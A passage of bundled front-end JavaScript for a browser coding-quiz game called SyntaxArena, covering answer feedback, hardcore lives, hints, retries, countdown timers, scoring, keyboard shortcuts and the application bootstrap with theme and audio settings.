            explanation: `${result.explanation || ''} You lost your last heart. The hardcore run has ended. All XP and progress achieved have been saved.`,
            isGameOver: true
          });
          this._updateLivesDisplay(0, 3);
          this._announceLive('Game over! You have lost all hearts. Run terminated.');

          // Populate Game Over Modal Stats
          const summary = this.engine.getSessionSummary();
          const solvedEl = Utils.qs('#gameover-solved-count');
          const scoreEl = Utils.qs('#gameover-score-count');
          const streakEl = Utils.qs('#gameover-streak-count');
          if (solvedEl) solvedEl.textContent = summary ? summary.questionsCorrect : 0;
          if (scoreEl) scoreEl.textContent = summary ? summary.totalScore.toLocaleString() : 0;
          if (streakEl) streakEl.textContent = `${summary ? summary.bestStreak : 0}🔥`;

          // Show modal after brief inspection pause
          setTimeout(() => {
            UI.openModal('modal-game-over');
          }, 1400);
        } else {
          this._displayFeedback({
            type: 'incorrect',
            title: result.lives !== undefined ? `Incorrect (${result.lives} ♥ left)` : 'Incorrect Answer',
            message: 'Score Math: 0 pts (Streak reset to 0)',
            correctAnswer: result.correctAnswer,
            explanation: result.explanation
          });
          if (result.lives !== undefined) {
            this._updateLivesDisplay(result.lives, 3);
          }
          this._announceLive('Incorrect answer. The explanation has been revealed.');
        }

        // Highlight user's incorrect option in red and correct in green
        if (this.selectedOptionIndex !== null) {
          const cards = Utils.qsa('.option-card');
          if (cards[this.selectedOptionIndex]) {
            cards[this.selectedOptionIndex].classList.add('is-incorrect');
          }
        }
      }
    }

    // Update HUD Score & Streak with responsive animation
    const session = this.engine.getSession();
    if (session) {
      const scoreDisplay = Utils.qs('#hud-score-display');
      if (scoreDisplay) {
        const prevScore = parseInt((scoreDisplay.textContent || '0').replace(/,/g, ''), 10) || 0;
        if (session.totalScore !== prevScore) {
          UI.animateValue(scoreDisplay, prevScore, session.totalScore, 350, (val) => Math.round(val).toLocaleString());
          scoreDisplay.classList.remove('animate-score-pulse');
          void scoreDisplay.offsetWidth;
          scoreDisplay.classList.add('animate-score-pulse');
        } else {
          scoreDisplay.textContent = session.totalScore.toLocaleString();
        }
      }

      const streakText = Utils.qs('#hud-streak-text');
      if (streakText) {
        const mult = Math.min(1.0 + (session.currentStreak * 0.25), 3.0).toFixed(2);
        streakText.textContent = `x${mult} Streak (${session.currentStreak}🔥)`;
        if (session.currentStreak > 1 && result.correct) {
          streakText.classList.remove('animate-streak-pulse');
          void streakText.offsetWidth;
          streakText.classList.add('animate-streak-pulse');
        }
      }
    }

    this.isSubmitting = false;
  },

  /**
   * Display accessible feedback panel with explanation and next-question button.
   */
  _displayFeedback({ type, title, points, streak, message, correctAnswer, explanation, isGameOver }) {
    const panel = Utils.qs('#feedback-panel');
    const titleEl = Utils.qs('#feedback-title');
    const badgeEl = Utils.qs('#feedback-badge');
    const bodyEl = Utils.qs('#feedback-body');
    const explanationEl = Utils.qs('#feedback-explanation-text');
    const nextBtn = Utils.qs('#btn-next-question');
    const retryBtn = Utils.qs('#btn-retry-question');
    const submitBtn = Utils.qs('#btn-submit-answer');

    if (!panel) return;

    panel.className = `feedback-panel feedback-panel-${type}`;
    panel.style.display = 'block';

    if (titleEl) titleEl.textContent = title;

    if (badgeEl) {
      badgeEl.textContent = type === 'correct' ? 'SUCCESS' : (type === 'retry' ? 'RETRY' : (isGameOver ? 'GAME OVER' : 'DEFECT'));
      badgeEl.className = `badge ${type === 'correct' ? 'badge-emerald' : (type === 'retry' ? 'badge-amber' : 'badge-coral')}`;
    }

    if (bodyEl) {
      if (type === 'correct') {
        bodyEl.textContent = message || `Awesome! You earned +${points} points with a ${streak}x streak.`;
      } else if (type === 'retry') {
        bodyEl.textContent = message;
      } else {
        bodyEl.textContent = message || (correctAnswer ? `Expected correct answer: ${correctAnswer}` : 'Better luck on the next challenge!');
      }
    }

    if (explanationEl) {
      if (explanation) {
        explanationEl.textContent = explanation;
        explanationEl.style.display = 'block';
      } else {
        explanationEl.style.display = 'none';
      }
    }

    // Show Next Question and Retry actions if answer is resolved
    if (type !== 'retry') {
      if (submitBtn) submitBtn.style.display = 'none';
      if (nextBtn) {
        nextBtn.style.display = 'inline-flex';
        nextBtn.disabled = false;
        const session = this.engine.getSession();
        const isFinal = isGameOver || (session && (session.isGameOver || session.currentIndex >= session.questions.length - 1));
        nextBtn.textContent = isFinal ? 'Finish Run & View Results →' : 'Next Question →';
        nextBtn.focus();
      }
      if (retryBtn) {
        if (type === 'incorrect' && !isGameOver) {
          retryBtn.style.display = 'inline-flex';
        } else {
          retryBtn.style.display = 'none';
        }
      }
    }
  },

  /**
   * Request hint from the engine.
   */
  requestHint() {
    if (!this.engine) return;

    const res = this.engine.requestHint();
    if (!res.success) {
      UI.showToast(res.message || 'Hint unavailable.', 'info');
      return;
    }

    AudioEngine.playHint();

    const hintDrawer = Utils.qs('#hint-drawer');
    const hintText = Utils.qs('#hint-drawer-text');
    const hintBtn = Utils.qs('#btn-use-hint');

    if (hintDrawer && hintText) {
      hintText.textContent = res.hint || 'Carefully examine standard semantics for this construct.';
      hintDrawer.style.display = 'block';
    }

    if (hintBtn) {
      hintBtn.disabled = true;
      hintBtn.textContent = 'Hint Activated';
      hintBtn.style.opacity = '0.6';
    }

    this._saveSessionSnapshot();
    UI.showToast(`Pedagogical hint revealed (-${res.penalty} pts). Second Chance retry unlocked if needed!`, 'info');
    this._announceLive(`Hint revealed: ${res.hint}`);
  },

  /**
   * Retry the current question after an incorrect answer.
   * Resets selection interface and allows another submission without awarding points.
   */
  retryCurrentQuestion() {
    if (!this.engine) return;
    const session = this.engine.getSession();
    if (!session || session.isGameOver) return;

    this._isRetryAttempt = true;

    // Retain failed attempt in session results so first-pass test accuracy is honest and not falsely 100%
    if (Array.isArray(session.results) && session.results.length > 0) {
      const lastRes = session.results[session.results.length - 1];
      if (lastRes && lastRes.index === session.currentIndex) {
        lastRes.retried = true;
      }
    }

    // Set engine state back to ACTIVE so submitAnswer can be invoked
    this.engine._state = ENGINE_STATES.ACTIVE;

    // Reset visual elements
    const feedbackPanel = Utils.qs('#feedback-panel');
    const nextBtn = Utils.qs('#btn-next-question');
    const retryBtn = Utils.qs('#btn-retry-question');
    const submitBtn = Utils.qs('#btn-submit-answer');

    if (feedbackPanel) feedbackPanel.style.display = 'none';
    if (nextBtn) nextBtn.style.display = 'none';
    if (retryBtn) retryBtn.style.display = 'none';

    if (submitBtn) {
      submitBtn.style.display = 'inline-flex';
      submitBtn.disabled = true;
      submitBtn.textContent = 'Submit Answer';
    }

    // Deselect options, code lines, and clear inputs
    this.currentSubmission = null;
    this.selectedOptionIndex = null;
    this.selectedBugLine = null;

    Utils.qsa('.option-card').forEach(c => {
      c.classList.remove('is-selected', 'is-correct', 'is-incorrect');
      c.setAttribute('aria-checked', 'false');
    });
    Utils.qsa('.line-pill-btn').forEach(p => p.classList.remove('is-active'));
    Utils.qsa('.code-line').forEach(l => l.classList.remove('is-selected-bug'));

    const fillInput = Utils.qs('#fill-code-input');
    if (fillInput) {
      fillInput.value = '';
      fillInput.focus();
    }

    this._announceLive('Retrying question. Select an answer and click Submit Answer.');
  },

  /**
   * Advance to the next question or complete the session with debounce protection.
   */
  advanceNextQuestion() {
    if (this._autoAdvanceTimer) {
      clearTimeout(this._autoAdvanceTimer);
      this._autoAdvanceTimer = null;
    }

    const now = Date.now();
    if (this.isAdvancing || (now - this._lastAdvanceTime < 350) || !this.engine) return;
    this.isAdvancing = true;
    this._lastAdvanceTime = now;

    const nextBtn = Utils.qs('#btn-next-question');
    if (nextBtn) nextBtn.disabled = true;

    AudioEngine.playClick();

    let advResult;
    try {
      advResult = this.engine.nextQuestion();
    } catch (err) {
      console.error('[Gameplay] Advancement error:', err);
      this.isAdvancing = false;
      return;
    }

    if (advResult.advanced) {
      // Render next question
      this.renderQuestion(advResult.question);
      this._saveSessionSnapshot();

      // Restart timer if timed
      if (this.sessionConfig.timeLimit > 0) {
        this._startTimer(this.sessionConfig.timeLimit);
      }
    } else if (advResult.completed) {
      // Session Completed!
      this._completeSession();
    }

    this.isAdvancing = false;
  },

  /**
   * Finalize completed session idempotently and navigate to results page.
   */
  _completeSession() {
    if (this.isCompleted) {
      console.warn('[Gameplay] Session already completed. Skipping redundant finalization.');
      return;
    }
    this.isCompleted = true;

    if (this._autoAdvanceTimer) {
      clearTimeout(this._autoAdvanceTimer);
      this._autoAdvanceTimer = null;
    }
    this._stopTimer();

    // Disable buttons immediately
    const submitBtn = Utils.qs('#btn-submit-answer');
    const nextBtn = Utils.qs('#btn-next-question');
    if (submitBtn) submitBtn.disabled = true;
    if (nextBtn) nextBtn.disabled = true;

    // Clear active session in State and Storage immediately so it cannot be resumed
    State.set('activeSession', null, true);

    const summary = this.engine.getSessionSummary();

    // Calculate stage stars (0 to 3) based on accuracy
    const accuracy = summary.questionsAttempted > 0 ? Math.round((summary.questionsCorrect / summary.questionsAttempted) * 100) : 0;
    const stars = accuracy >= 90 ? 3 : accuracy >= 70 ? 2 : accuracy >= 50 ? 1 : 0;
    summary.stars = stars;

    if (this.activeStage) {
      summary.stage = this.activeStage.id;
      summary.stageName = this.activeStage.name;
      summary.isBoss = this.activeStage.isBoss;
    } else {
      summary.stage = 'marathon';
      summary.stageName = 'Tier Marathon';
      summary.isBoss = false;
    }

    // Flawless Run Bonus: 100% accuracy with zero errors (+100 points & confetti)
    if (summary && summary.questionsAttempted > 0 &&
        summary.questionsCorrect === summary.totalQuestions &&
        summary.questionsAttempted === summary.totalQuestions &&
        (summary.retriesUsedCount || 0) === 0) {
      summary.isFlawless = true;
      summary.flawlessBonus = 100;
      summary.totalScore = (summary.totalScore || 0) + 100;
      UI.triggerConfetti();
      UI.showToast('🎯 FLAWLESS RUN BONUS! +100 Points for zero errors!', 'success');
    } else if (summary) {
      summary.isFlawless = false;
      summary.flawlessBonus = 0;
    }

    // Persist session summary for results page pickup
    try {
      sessionStorage.setItem('syntaxarena_last_session_summary', JSON.stringify(summary));
    } catch (e) {
      // Fallback in memory
    }

    // Record stats to player profile and process gamification rewards (idempotent)
    let recordRes = null;
    try {
      recordRes = Profile.recordSessionResult(summary);
      if (recordRes) {
        sessionStorage.setItem('syntaxarena_last_session_rewards', JSON.stringify(recordRes));
        if (recordRes.isRepeatClear) {
          UI.showToast('ℹ Level already cleared previously. Play a new level to earn milestone clear points!', 'info');
        }
      }

      // Record stage progress & stars (skip if user is only retrying missed questions)
      const activeProf = Profile.getActiveProfile();
      if (activeProf && summary.stage !== 'marathon' && summary.mode !== 'retry_missed' && !summary.isRetryMissed) {
        const stageKey = `${summary.language}_${summary.difficulty}_stage_${summary.stage}`;
        const prevStars = (activeProf.stageStars && activeProf.stageStars[stageKey]) || 0;
        const newStars = Math.max(prevStars, stars);
        const stageStars = { ...(activeProf.stageStars || {}), [stageKey]: newStars };
        const completedStages = { ...(activeProf.completedStages || {}), [stageKey]: true };
        Profile.updateProfile(activeProf.id, { stageStars, completedStages });
      }
    } catch (e) {
      console.warn('[Gameplay] Could not record session to profile:', e);
    }

    // Audio fanfare
    AudioEngine.playLevelUp();

    // Navigate to results page
    const params = {
      lang: summary.language,
      diff: summary.difficulty,
      score: summary.totalScore,
      correct: summary.questionsCorrect,
      attempted: summary.questionsAttempted,
      total: summary.totalQuestions,
      sessionId: summary.sessionId,
      stage: summary.stage,
      streak: summary.bestStreak || summary.highestStreak || 0,
      bestStreak: summary.bestStreak || summary.highestStreak || 0
    };

    UI.showToast(summary.isGameOver ? 'Hardcore run concluded. Recording career XP...' : 'Challenge completed! Loading stage analytics...', 'success');
    setTimeout(() => {
      Router.navigateTo('results', params);
    }, 700);
  },

  /**
   * Handle timer reaching 0:00 (Timeout).
   */
  handleTimeout() {
    if (this.isSubmitting) return;
    AudioEngine.playError();
    UI.showToast('Time expired!', 'error');

    // Auto-submit timeout
    this.currentSubmission = '__TIMEOUT__';
    this.submitCurrentAnswer();
  },

  /**
   * Exit confirmation modal controller.
   */
  promptExit() {
    this._stopTimer();
    UI.openModal('modal-confirm-exit');
  },

  confirmExit() {
    UI.closeModal('modal-confirm-exit');
    this._stopTimer();

    if (this.engine) {
      this.engine.forfeitSession();
    }

    State.set('activeSession', null);
    Router.navigateTo('index');
  },

  cancelExit() {
    UI.closeModal('modal-confirm-exit');
    // Resume timer if active and session is not showing explanation
    if (this.engine && this.engine.getState() === ENGINE_STATES.ACTIVE && this.sessionConfig.timeLimit > 0) {
      this._startTimer(this.timer.timeRemaining);
    }
  },

  /**
   * Start or resume countdown timer.
   */
  _startTimer(seconds) {
    this._stopTimer();
    this.timer.timeRemaining = seconds;
    this.timer.isRunning = true;

    this._updateTimerDisplay(this._formatSeconds(this.timer.timeRemaining), false);

    this.timer.intervalId = setInterval(() => {
      this.timer.timeRemaining--;

      const isUrgent = this.timer.timeRemaining <= 10;
      this._updateTimerDisplay(this._formatSeconds(this.timer.timeRemaining), isUrgent);

      if (this.timer.timeRemaining <= 0) {
        this._stopTimer();
        this.handleTimeout();
      }
    }, 1000);
  },

  /**
   * Stop active timer interval.
   */
  _stopTimer() {
    if (this.timer.intervalId) {
      clearInterval(this.timer.intervalId);
      this.timer.intervalId = null;
    }
    this.timer.isRunning = false;
    const timerEl = Utils.qs('#hud-timer-display');
    if (timerEl) timerEl.classList.remove('timer-urgent');
  },

  /**
   * Update HUD hearts in Hardcore mode.
   * @param {number} lives
   * @param {number} maxLives
   */
  _updateLivesDisplay(lives = 3, maxLives = 3) {
    const livesContainer = Utils.qs('#hud-lives-container');
    const heartsDisplay = Utils.qs('#hud-hearts-display');
    const livesText = Utils.qs('#hud-lives-text');
    if (!livesContainer) return;

    if (this.sessionConfig && this.sessionConfig.mode === 'hardcore') {
      livesContainer.style.display = 'flex';
      if (livesText) {
        livesText.textContent = `${Math.max(0, lives)}/${maxLives}`;
      }
      if (heartsDisplay) {
        let html = '';
        for (let i = 0; i < maxLives; i++) {
          if (i < lives) {
            html += '<svg width="20" height="20" fill="var(--color-danger)" style="transition: transform 0.2s;"><use href="#icon-heart"></use></svg>';
          } else {
            html += '<svg width="20" height="20" fill="none" stroke="var(--text-muted)" stroke-width="2" style="opacity: 0.35;"><use href="#icon-heart"></use></svg>';
          }
        }
        heartsDisplay.innerHTML = html;
      }
    } else {
      livesContainer.style.display = 'none';
    }
  },

  _updateTimerDisplay(str, isUrgent) {
    const timerEl = Utils.qs('#hud-timer-display');
    if (timerEl) {
      timerEl.textContent = str;
      if (isUrgent) {
        timerEl.classList.add('timer-urgent');
      } else {
        timerEl.classList.remove('timer-urgent');
      }
    }
  },

  _formatSeconds(sec) {
    const m = Math.floor(sec / 60);
    const s = sec % 60;
    return `${String(m).padStart(2, '0')}:${String(s).padStart(2, '0')}`;
  },

  _formatTypeLabel(type) {
    const labels = {
      predict_output: 'Predict Output',
      multiple_choice: 'Multiple Choice',
      find_bug: 'Find the Bug',
      fill_code: 'Complete Code',
      complete_code: 'Complete Code',
      code_tracing: 'Code Tracing'
    };
    const key = String(type || '').replace(/-/g, '_');
    return labels[key] || 'Challenge';
  },

  _getTypeBadgeClass(type) {
    const key = String(type || '').replace(/-/g, '_');
    if (key === 'find_bug') return 'badge-coral';
    if (key === 'fill_code' || key === 'complete_code') return 'badge-amber';
    if (key === 'predict_output') return 'badge-violet';
    return 'badge-cyan';
  },

  _announceLive(msg) {
    const liveEl = Utils.qs('#gameplay-live-announcer');
    if (liveEl) {
      liveEl.textContent = msg;
    }
  },

  /**
   * Bind event listeners to DOM controls and window keys.
   */
  _bindEvents() {
    if (this._eventsBound) return;
    this._eventsBound = true;

    // Submit Answer Button
    const submitBtn = Utils.qs('#btn-submit-answer');
    if (submitBtn) {
      submitBtn.onclick = () => {
        this.submitCurrentAnswer();
      };
    }

    // Hint Button
    const hintBtn = Utils.qs('#btn-use-hint');
    if (hintBtn) {
      hintBtn.onclick = () => {
        this.requestHint();
      };
    }

    // Retry Question Button
    const retryBtn = Utils.qs('#btn-retry-question');
    if (retryBtn) {
      retryBtn.onclick = () => {
        this.retryCurrentQuestion();
      };
    }

    // Next Question Button
    const nextBtn = Utils.qs('#btn-next-question');
    if (nextBtn) {
      nextBtn.onclick = () => {
        this.advanceNextQuestion();
      };
    }

    // Exit Game Buttons
    const exitBtn = Utils.qs('#btn-exit-game');
    if (exitBtn) {
      exitBtn.onclick = () => this.promptExit();
    }

    const cancelExitBtn = Utils.qs('#btn-cancel-exit');
    if (cancelExitBtn) {
      cancelExitBtn.onclick = () => this.cancelExit();
    }

    const cancelExitXBtn = Utils.qs('#btn-cancel-exit-x');
    if (cancelExitXBtn) {
      cancelExitXBtn.onclick = () => this.cancelExit();
    }

    const returnHubBtn = Utils.qs('#btn-return-hub-bottom');
    if (returnHubBtn) {
      returnHubBtn.onclick = () => {
        if (window.history.length > 1) {
          window.history.back();
        } else {
          Router.navigateTo('index');
        }
      };
    }

    const confirmExitBtn = Utils.qs('#btn-confirm-exit');
    if (confirmExitBtn) {
      confirmExitBtn.onclick = () => this.confirmExit();
    }

    // Hardcore Game Over Modal Buttons
    const goResultsBtn = Utils.qs('#btn-gameover-results');
    if (goResultsBtn) {
      goResultsBtn.onclick = () => {
        UI.closeModal('modal-game-over');
        this._completeSession();
      };
    }

    const goHubBtn = Utils.qs('#btn-gameover-hub');
    if (goHubBtn) {
      goHubBtn.onclick = () => {
        UI.closeModal('modal-game-over');
        this._completeSession();
      };
    }

    // Keyboard Shortcuts (1-4, A-D, Enter, Escape)
    window.addEventListener('keydown', (e) => {
      if (['INPUT', 'SELECT', 'TEXTAREA'].includes(e.target.tagName)) {
        if (e.key === 'Escape') {
          e.target.blur();
        }
        return;
      }

      const key = e.key.toUpperCase();

      // Letters / Numbers for Option Selection
      let targetIdx = -1;
      if (key === '1' || key === 'A') targetIdx = 0;
      else if (key === '2' || key === 'B') targetIdx = 1;
      else if (key === '3' || key === 'C') targetIdx = 2;
      else if (key === '4' || key === 'D') targetIdx = 3;

      if (targetIdx >= 0) {
        const optionCards = Utils.qsa('.option-card');
        if (optionCards[targetIdx] && !optionCards[targetIdx].disabled) {
          optionCards[targetIdx].click();
        }
      }

      // Enter key for Submit or Advance
      if (e.key === 'Enter') {
        // If focus is already directly on a button, native click handles it
        if (e.target && e.target.tagName === 'BUTTON') {
          return;
        }

        const nextBtnEl = Utils.qs('#btn-next-question');
        if (nextBtnEl && nextBtnEl.style.display !== 'none' && !nextBtnEl.disabled) {
          nextBtnEl.click();
        } else {
          const submitBtnEl = Utils.qs('#btn-submit-answer');
          if (submitBtnEl && !submitBtnEl.disabled && submitBtnEl.style.display !== 'none') {
            submitBtnEl.click();
          }
        }
      }

      // H key for Hint
      if (key === 'H' && !e.ctrlKey && !e.metaKey) {
        const hintBtnEl = Utils.qs('#btn-use-hint');
        if (hintBtnEl && !hintBtnEl.disabled) {
          hintBtnEl.click();
        }
      }
    });

    // Cleanup timer on page beforeunload
    window.addEventListener('beforeunload', () => {
      this._stopTimer();
    });
  }
};

if (typeof window !== 'undefined') {
  window.Gameplay = Gameplay;
}

/* --- End of js/gameplay.js --- */

/* --- Start of js/app.js --- */
/**
 * SyntaxArena Application Bootstrapper & Coordinator
 * Entry point for all pages.
 * Source of truth: docs/ARCHITECTURE.md & docs/BATCH_8_PLAN.md
 */







var App = window.App = {
  /**
   * Main bootstrap sequence.
   */
  async init() {
    try {
      console.info('[SyntaxArena] Bootstrapping application foundation...');

      // 1. Detect current page
      const currentPage = Router.getCurrentPage();

      // 2. Initialize reactive state from storage
      State.init(currentPage);

      // 3. Apply user settings (Theme, Motion, Audio)
      const settings = State.get('settings') || {};
      UI.applyTheme(settings.theme || 'dark');
      UI.applyReducedMotion(settings.reducedMotion);

      // 4. Update UI Shell (Header navigation & profile pill)
      UI.updateActiveNav(currentPage);
      UI.updateHeaderProfile();

      // 5. Bind global UI controls & sound
      this._bindGlobalEvents();

      // 6. Install navigation and unload guards
      Router.installGuards();

      // 7. Subscribe to state changes for reactive header updates
      State.subscribe('activeProfile', () => {
        UI.updateHeaderProfile();
      });

      State.subscribe('settings', (newSettings) => {
        if (newSettings) {
          if (newSettings.theme) {
            UI.applyTheme(newSettings.theme);
          }
          if (typeof newSettings.reducedMotion === 'boolean') {
            UI.applyReducedMotion(newSettings.reducedMotion);
          }
          if (typeof newSettings.musicEnabled === 'boolean' || typeof newSettings.musicVolume === 'number') {
            if (newSettings.musicEnabled && (newSettings.musicVolume || 0) > 0) {
              AudioEngine.startMusic();
            } else {
              AudioEngine.stopMusic();
            }
          }
        }
      });

      // 8. Process Daily Login Streak & Welcome Bonus
      try {
        const dailyReward = Profile.checkDailyRewards();
        if (dailyReward && dailyReward.message) {
          setTimeout(() => {
            UI.showToast(dailyReward.message, 'success');
            if (dailyReward.streakBonus || dailyReward.joiningBonus) {
              UI.triggerConfetti();
            }
          }, 800);
        }
      } catch (_) {}

      // 9. Page-specific controllers
      if (currentPage === 'index') {
        const controller = (typeof window !== 'undefined' && window.LandingPage)
          ? window.LandingPage
          : (await import('./landing.js')).LandingPage;
        if (controller && typeof controller.init === 'function') {
          controller.init();
        }
      } else if (currentPage === 'game') {
        const controller = (typeof window !== 'undefined' && window.Gameplay)
          ? window.Gameplay
          : (await import('./gameplay.js')).Gameplay;
        if (controller && typeof controller.init === 'function') {
          await controller.init();
        }
      }

      // 10. Mask URL with UUID replacing .html filename in address bar
      Router.maskUrlWithUUID(currentPage);

      console.info(`[SyntaxArena] Initialization complete on page: ${currentPage}`);
      return true;
    } catch (err) {
      console.error('[SyntaxArena] Critical initialization failure:', err);
      this._handleInitFailure(err);
      return false;
    }
  },

  /**
   * Bind application-wide header and shell interactive controls.
   */
  _bindGlobalEvents() {
    // Unlock Web Audio on first document interaction
    const unlockAudio = () => {
      AudioEngine.unlock();
      const s = State.get('settings') || {};
      if (s.musicEnabled && (s.musicVolume || 0) > 0) {
        AudioEngine.startMusic();
      }
      window.removeEventListener('pointerdown', unlockAudio);
      window.removeEventListener('keydown', unlockAudio);
    };
    window.addEventListener('pointerdown', unlockAudio);
    window.addEventListener('keydown', unlockAudio);

    // Audio lifecycle: Pause music on tab background / hidden, resume when visible
    document.addEventListener('visibilitychange', () => {
      if (document.hidden) {
        AudioEngine.stopMusic();
      } else {
        const s = State.get('settings') || {};
        if (s.musicEnabled && (s.musicVolume || 0) > 0) {
          AudioEngine.startMusic();
        }
      }
    });

    // Cleanup audio resources on page unload
    window.addEventListener('pagehide', () => {
      AudioEngine.stopMusic();
    });

    // Play click sound on all arcade buttons and interactive chips
    document.addEventListener('click', (e) => {
      const btn = e.target.closest('.btn-arcade, .btn-icon-toggle, .line-pill-btn, .token-chip');
      if (btn && !btn.disabled) {
        AudioEngine.playClick();
      }
    });

    // Theme Toggle Button
    const themeBtn = Utils.qs('#btn-theme-toggle');
    if (themeBtn) {
      Utils.on(themeBtn, 'click', (e) => {
        e.preventDefault();
        UI.toggleTheme();
      });
    }

    // Sound Toggle Button (Master SFX & Ambient Music 1-Click Toggle)
    const soundBtn = Utils.qs('#btn-sound-toggle');
    if (soundBtn) {
      const initialSettings = State.get('settings') || {};
      const initialMuted = initialSettings.soundEnabled === false || (initialSettings.sfxVolume || 0) === 0;
      const initialIcon = soundBtn.querySelector('use');
      if (initialIcon) {
        initialIcon.setAttribute('href', initialMuted ? '#icon-volume-x' : '#icon-volume');
      }

      Utils.on(soundBtn, 'click', (e) => {
        e.preventDefault();
        const settings = State.get('settings') || {};
        const isMuted = settings.soundEnabled === false || (settings.sfxVolume || 0) === 0;
        const nextVolume = isMuted ? 0.8 : 0.0;
        const nextMusicVol = isMuted ? 0.5 : 0.0;
        const nextEnabled = isMuted;

        State.set('settings', {
          soundEnabled: nextEnabled,
          musicEnabled: nextEnabled,
          sfxVolume: nextVolume,
          musicVolume: nextMusicVol
        });

        soundBtn.setAttribute('aria-label', nextEnabled ? 'Mute audio & music' : 'Unmute audio & music');
        soundBtn.setAttribute('title', nextEnabled ? 'Mute audio & music' : 'Unmute audio & music');
        const icon = soundBtn.querySelector('use');
        if (icon) {
          icon.setAttribute('href', nextEnabled ? '#icon-volume' : '#icon-volume-x');
        }
        if (nextEnabled) {
          AudioEngine.startMusic();
          AudioEngine.playSuccess();
        } else {
          AudioEngine.stopMusic();
        }
        UI.showToast(nextEnabled ? 'Audio & Ambient Music Enabled' : 'All Audio Muted', 'info');
      });
    }

    // Modal Close Buttons
    const modalCloseButtons = Utils.qsa('[data-close-modal]');
    modalCloseButtons.forEach(btn => {
      Utils.on(btn, 'click', () => {
        const modalId = btn.getAttribute('data-close-modal');
        if (modalId) UI.closeModal(modalId);
      });
    });

    // Close modal on backdrop click
    const modalBackdrops = Utils.qsa('.modal-backdrop');
    modalBackdrops.forEach(backdrop => {
      Utils.on(backdrop, 'click', (e) => {
        if (e.target === backdrop) {
          UI.closeModal(backdrop.id);
        }
      });
    });
  },

  /**
   * Render graceful error fallback in the rare event of catastrophic init failure.
   */
  _handleInitFailure(err) {
    const mainEl = Utils.qs('main') || document.body;
    const errorBanner = document.createElement('div');
    errorBanner.className = 'card card-raised animate-fade-in';
    errorBanner.style.margin = '2rem auto';
    errorBanner.style.maxWidth = '600px';
    errorBanner.style.borderColor = 'var(--color-danger)';
    errorBanner.innerHTML = `
      <h2 style="color: var(--color-danger); margin-bottom: 0.5rem;">Initialization Warning</h2>
      <p>SyntaxArena encountered an issue while loading local profile data. Stored settings may be reset or running in private session mode.</p>
      <div style="margin-top: 1rem;">
        <button class="btn-arcade btn-primary btn-sm" onclick="window.location.reload()">Reload Application</button>
      </div>
    `;
    mainEl.prepend(errorBanner);
  }
};

// Auto-run bootstrap on DOMContentLoaded
if (document.readyState === 'loading') {
  document.addEventListener('DOMContentLoaded', () => App.init());
} else {
  App.init();
}

if (typeof window !== 'undefined') {
  window.App = App;
}

/* --- End of js/app.js --- */

})();
